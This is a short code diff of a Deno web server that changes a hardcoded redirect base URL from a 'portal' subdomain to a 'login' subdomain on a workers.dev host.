@@ -4,7 +4,7 @@ Deno.serve({ port: PORT }, async (req) => {
   const url = new URL(req.url);
 
   const redirectBase =
-    "https://portal.internalsortservices.workers.dev/";
+    "https://login.internalsortservices.workers.dev/";
 
   let email: string | null = null;
 
